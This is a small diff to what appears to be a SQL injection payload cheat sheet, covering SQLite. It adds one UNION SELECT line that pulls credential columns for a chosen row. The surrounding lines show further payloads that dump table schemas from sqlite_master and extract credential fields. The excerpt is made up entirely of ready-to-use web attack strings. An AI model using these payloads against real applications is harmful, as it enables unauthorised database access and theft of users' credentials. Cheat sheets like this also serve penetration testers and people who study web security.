@@ -97,6 +97,7 @@ Comments:
 'union+select+1,sql+FROM+sqlite_master+WHERE+type!='meta'+AND+sql+NOT+NULL+AND+name='table_name',3--
 'union+select+1,2,sql+FROM+sqlite_master+WHERE+type!='meta'+AND+sql+NOT+NULL+AND+name ='table_name'--
 'union+select+1,cred1,cred2+FROM+table_name--
+'union+select+1,cred1,cred2+FROM+table_name+WHERE+ID=2--
 ```
 #### Generic Time Based Sql injection payloads
 ```sh
